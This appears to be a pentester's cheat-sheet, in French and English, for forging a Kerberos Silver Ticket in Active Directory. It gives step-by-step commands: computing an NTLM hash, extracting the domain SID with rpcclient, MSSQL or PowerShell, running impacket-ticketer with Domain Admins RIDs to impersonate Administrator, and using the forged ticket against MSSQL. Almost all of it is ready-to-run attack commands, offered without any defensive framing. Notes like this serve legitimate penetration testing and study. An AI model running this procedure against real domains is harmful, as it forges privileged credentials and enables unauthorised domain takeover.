# Silver Ticket

## Requirements
- NTLM hash du compte de service
- Domain SID
- Service Principal Name (SPN)

## Steps

### 1. Calculer le hash NTLM
```bash
python3 -c 'import hashlib; print(hashlib.new("md4", "PASSWORD".encode("utf-16le")).hexdigest())'
```

### 2. Obtenir le Domain SID

**Via MSSQL:**
```sql
SELECT SUSER_SID();
# Résultat hex: 0x0105000000...
# Convertir avec script Python (voir Tools/SID-Conversion.md)
```

**Via rpcclient:**
```bash
rpcclient -U "user%password" <DC_IP>
rpcclient $> lsaquery
```

**Via PowerShell:**
```powershell
(Get-ADDomain).DomainSID.Value
```

### 3. Identifier les groupes privilégiés

```sql
# Récupérer le RID d'un groupe
SELECT SUSER_SID('DOMAIN\GroupName');
```

### 4. Définir le SPN

| Service | Format |
|---------|--------|
| MSSQL | `MSSQLSvc/hostname.domain.com:1433` |
| CIFS | `cifs/hostname.domain.com` |
| HTTP | `HTTP/hostname.domain.com` |
| LDAP | `ldap/hostname.domain.com` |

### 5. Générer le ticket

```bash
impacket-ticketer \
  -nthash <NTLM_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> \
  -spn <SPN> \
  -groups <GROUP_RIDs> \
  -user-id <USER_RID> \
  <USERNAME>
```

**Exemple:**
```bash
impacket-ticketer \
  -nthash a1b2c3d4... \
  -domain-sid "S-1-5-21-123456789-123456789-123456789" \
  -domain CORP.LOCAL \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  -groups 512,1105 \
  -user-id 500 \
  Administrator
```

### 6. Utiliser le ticket

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
mssqlclient.py -k -no-pass hostname.domain.com
```

## RIDs importants

| RID | Nom |
|-----|-----|
| 500 | Administrator |
| 512 | Domain Admins |
| 519 | Enterprise Admins |

---
